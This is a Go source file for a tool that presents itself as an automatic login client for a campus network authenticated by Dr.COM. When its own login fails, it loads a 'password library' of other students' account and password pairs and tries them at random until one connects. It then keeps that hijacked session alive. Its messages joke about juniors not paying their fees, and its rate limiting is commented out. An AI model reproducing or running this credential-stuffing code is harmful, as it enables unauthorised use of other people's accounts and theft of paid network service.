// CCMU Automatic Connector
//
// This tool provides automatic login feature for
// connect to the network authenticated by dr.com
//
// Author: ms2008vip@gmail.com at 2017/8/15 11:10:02

//go:generate goversioninfo -icon=ballet.ico

package main

import (
	"bufio"
	"flag"
	"fmt"
	"math/rand"
	"os"
	"strings"
	"time"

	"github.com/ms2008/poemoon/conf"
	"github.com/ms2008/poemoon/service"
	"github.com/ms2008/poemoon/utils"
	"github.com/toqueteos/webbrowser"
)

const (
	URL  = "http://192.168.161.2/"
	FILE = "ids.txt"
)

var buildstamp string = ""
var githash string = ""

func main() {
	defer log.Close()

	args := os.Args
	if len(args) == 2 && (args[1] == "--version" || args[1] == "-v") {
		fmt.Printf("Git Commit Hash: %s\n", githash)
		fmt.Printf("UTC Build Time : %s\n", buildstamp)
		return
	}

	flag.Parse()
	if err := conf.Init(); err != nil {
		panic(err)
	}

	svr := service.New(conf.Conf)
	userList := fileTolines(FILE)
	rand.Seed(time.Now().Unix())
	count := 1
	//fmt.Println(userList)

	// 1. challenge
	if err := svr.Challenge(svr.ChallengeTimes); err != nil {
		log.Error("drcomSvc.Challenge(%d) error(%v)", svr.ChallengeTimes, err)
		return
	}

	// 2. login
	if err := svr.Login(); err != nil {
		log.Error("drcomSvc.Login() error(%v)", err)

		for {

			if count == 1 && len(userList) == 1 && strings.TrimSpace(userList[0]) == "\xef\xbb\xbf" {
				fmt.Println("密码库是空的！")
				fmt.Println("按下「CTRL + C」终止本程序")
				fmt.Scanln()
				return
			} else if len(userList) == 0 {
				fmt.Println("你的学弟学妹们都太抠了，连费都舍不得充！")
				fmt.Println("按下「CTRL + C」终止本程序")
				fmt.Scanln()
				return
			}

			// 速率限制
			// if count%1000 == 0 {
			//     fmt.Printf("processed at least %d iterms\n", count)
			//     <- time.After(5 * time.Second)
			//     fmt.Println("go on....")
			// }

			n := rand.Intn(len(userList))
			line := userList[n]

			// 将测试过的用户移除出当前密码库
			userList = append(userList[:n], userList[n+1:]...)
			count++

			//userInfo := strings.Split(line, "\t")
			userInfo := strings.Fields(line)
			if len(userInfo) < 2 {
				log.Critical("shit happens: unrecognized user info format: %v", userInfo)
				continue
			}
			account := userInfo[0]
			password := userInfo[len(userInfo)-1]

			// update the account info
			svr.Conf.Username = account
			svr.Conf.Password = password

			if err := svr.Login(); err != nil {
				log.Error("drcomSvc.Login() error(%v)", err)
			} else {
				break
			}
		}
	}

	webbrowser.Open(URL)
	// 3. keepalive
	ping_times := 0
	for {
		ping_times++
		if err := svr.Alive(); err != nil {
			log.Error("drcomSvc.Alive() error(%v)", err)
			return
		}
		time.Sleep(time.Second * 12)
	}
}

func fileTolines(filePath string) []string {
	f, err := os.Open(filePath)
	if err != nil {
		//panic(err)
		fmt.Println("没有发现密码库文件！")
		fmt.Println("按下「CTRL + C」终止本程序")
		fmt.Scanln()
	}
	defer f.Close()

	var lines []string
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	if err := scanner.Err(); err != nil {
		fmt.Fprintln(os.Stderr, err)
	}

	return lines
}

func chunkTolines(chunk string) []string {
	var lines []string
	lines = strings.Split(chunk, "\n")

	return lines
}
